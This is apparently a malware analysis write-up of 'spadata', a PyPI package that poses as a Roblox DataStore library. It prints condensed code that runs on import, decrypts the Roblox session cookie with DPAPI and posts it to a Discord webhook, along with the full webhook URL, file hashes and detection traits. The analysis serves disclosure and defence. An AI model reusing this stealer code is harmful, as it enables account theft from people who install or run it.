---
title: "spadata: Gimme all your Roblox — the PyPI DataStore lib that isn't"
date: 2026-06-03
summary: "It promises a Roblox DataStore library and ships none of it — just an __init__.py that, on import, DPAPI-decrypts your Roblox session cookie and posts the cleartext to a Discord webhook; the README can't even spell its own name."
packageName: spadata
ecosystem: PyPI
---

<img src="/assets/images/spadata-roblox-stickup-meme.jpg" alt="Meme: a kitten with its paws up at gunpoint — 'GIMME ALL YOUR ROBLOX PLZ.' spadata mugs the victim for exactly one thing: their Roblox session cookie.">

`spadata` sells itself as a Python library for managing your Roblox DataStore and ships none of it — no storage code, no API calls, just a cookie grab that fires the moment you `import spadata`, with the README misspelling its own name «spaysdata» along the way.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `spadata` |
| Version | `0.1.1` |
| Summary | `Библиотека для работы с DataStore в Roblox` |
| Description | `Custom Python library for Roblox DataStore.` |
| Requires-Python | `>=3.8` |
| Requires-Dist | `requests`; `pywin32; sys_platform == "win32"` |
| Entry point | `spadata-run = spadata.main:retrieve_roblox_cookies` |
| Generator | `setuptools 82.0.1` |
| Tag | `py3-none-any` |

## One import, one cookie, one webhook

The wheel holds two files and no product: `__init__.py` calls the stealer at import time inside a bare try/except, so the theft fires when Python loads the package and any error dies silently. It copies Roblox's local cookie store `robloxcookies.dat` to the temp folder, reads the base64 field, and — since Roblox keeps it DPAPI-encrypted — calls `win32crypt.CryptUnprotectData` to unlock the loot before taking it. The cleartext `.ROBLOSECURITY` cookie then posts straight to a hardcoded Discord webhook, captioned `Decrypted Content:`; replayed in a browser it walks past the password and 2FA, handing over the Robux, the inventory, and the resale value in one string.

<pre class="lang-js"><code><span class="tok-com"># __init__.py — import is the trigger</span>
<span class="tok-kw">from</span> .main <span class="tok-kw">import</span> retrieve_roblox_cookies
<span class="tok-kw">try</span>: <span class="tok-fn">retrieve_roblox_cookies</span>()            <span class="tok-com"># «выполнится АВТОМАТИЧЕСКИ» — runs on import</span>
<span class="tok-kw">except</span> Exception <span class="tok-kw">as</span> e: <span class="tok-fn">print</span>(e)

<span class="tok-com"># main.py — copy, decrypt, post (condensed)</span>
webhook = <span class="tok-str">"https://discord.com/api/webhooks/1501511921185325186/0-lN4d-…"</span>
shutil.<span class="tok-fn">copy</span>(roblox_cookies_path, dst)         <span class="tok-com"># %USERPROFILE%\...\LocalStorage\robloxcookies.dat</span>
encoded = json.<span class="tok-fn">load</span>(<span class="tok-fn">open</span>(dst))[<span class="tok-str">"CookiesData"</span>]
clear = win32crypt.<span class="tok-fn">CryptUnprotectData</span>(base64.<span class="tok-fn">b64decode</span>(encoded), <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-num">0</span>)[<span class="tok-num">1</span>]
requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: <span class="tok-str">"Decrypted Content:"</span>})
requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: clear.<span class="tok-fn">decode</span>(<span class="tok-str">"utf-8"</span>, errors=<span class="tok-str">"ignore"</span>)})
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/platform` | Reads Roblox's local cookie store `robloxcookies.dat` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/dpapi` | DPAPI-decrypted secret posted to a Discord webhook |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/channel/messaging` | Hardcoded `discord.com/api/webhooks/...` URL |
| <span class="sev-dot notable" title="notable"></span> | `objectives/credential-access/browser/dpapi` | `win32crypt.CryptUnprotectData` on the decoded blob |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/data/control-flow/module-exec` | Import-time call silenced by try/except |
| <span class="sev-dot notable" title="notable"></span> | `objectives/anti-static/obfuscation/code-metrics/source` | Russian comments trip the non-ASCII ratio |

There's no persistence, no second stage, and no obfuscation past the try/except — just a stickup that works because the mark came for a shortcut and was never going to open `__init__.py`.

## Indicators

| Type | Value |
| --- | --- |
| Wheel | `spadata-0.1.1-py3-none-any.whl` |
| Wheel SHA-256 | [`d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff`](https://lab.atomdrift.org/file/d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff) |
| `main.py` SHA-256 | [`cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8`](https://lab.atomdrift.org/file/cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8) |
| `__init__.py` SHA-256 | [`44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c`](https://lab.atomdrift.org/file/44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c) |
| Discord webhook | `https://discord.com/api/webhooks/1501511921185325186/0-lN4d-dYtJXAI0Wzf_ay225eK_DzM3Prp8-uTh4CVVt-1gDPJHG0SEZL7Pe9GCAQcOT` |
| Cookie file read | `%USERPROFILE%\AppData\Local\Roblox\LocalStorage\robloxcookies.dat` |
</content>
